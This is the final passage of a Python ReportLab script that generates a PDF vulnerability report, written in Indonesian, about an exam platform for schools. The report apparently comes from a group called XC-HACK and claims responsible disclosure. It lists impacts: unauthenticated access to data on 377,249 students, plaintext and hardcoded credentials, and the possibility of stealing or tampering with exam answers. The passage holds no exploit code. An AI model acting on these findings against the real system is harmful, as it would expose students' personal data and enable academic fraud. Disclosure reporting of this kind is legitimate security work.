    "Seluruh data siswa, guru, soal, jawaban, dan konfigurasi ujian dari "
    "<b>lebih dari 1,800 sekolah</b> dapat diakses, dimodifikasi, atau dihapus "
    "tanpa autentikasi apapun dalam waktu kurang dari 30 menit.", sBody))

story.append(Spacer(1, 3*mm))

risk_items = [
    "🔴 Fraud akademik massal: nilai 2.5M+ jawaban siswa dapat dimanipulasi secara otomatis.",
    "🔴 Data breach: 377,249 data siswa + 1,828 akun sekolah terekspos (pelanggaran UU PDP).",
    "🔴 Credential theft: password plaintext pengawas terekspos + WordPress creds hardcoded.",
    "🔴 Supply chain attack: kunci jawaban dan soal ujian dapat dicuri atau diganti.",
    "🔴 Infrastructure takeover: konfigurasi keamanan ujian dapat dimatikan oleh siapapun.",
]
for r in risk_items:
    story.append(Paragraph(r, ParagraphStyle("ri", fontName="Helvetica", fontSize=9,
        textColor=C_ORANGE, leading=14, leftIndent=6, spaceAfter=3)))

story.append(Spacer(1, 5*mm))
story.append(HR(C_GRAY))
story.append(Spacer(1, 3*mm))
story.append(Paragraph(
    "Report ini disusun oleh <b>XC-HACK · Hacking XC Hub</b> — 2026-07-23. "
    "Semua temuan telah diverifikasi secara live dengan proof-of-concept. "
    "Responsible disclosure. Semua test records dibersihkan pasca verifikasi.",
    sFooter))
story.append(Spacer(1, 2*mm))
story.append(HR(C_GRAY, 0.3, 2))
story.append(Paragraph("XC-HACK · Hacking XC Hub · pointrungkat-art · 2026", sFooter))

# ─── BUILD ────────────────────────────────────────────────────────────────────
doc.build(story, onFirstPage=on_page, onLaterPages=on_page)
print(f"[OK] {OUTPUT}")
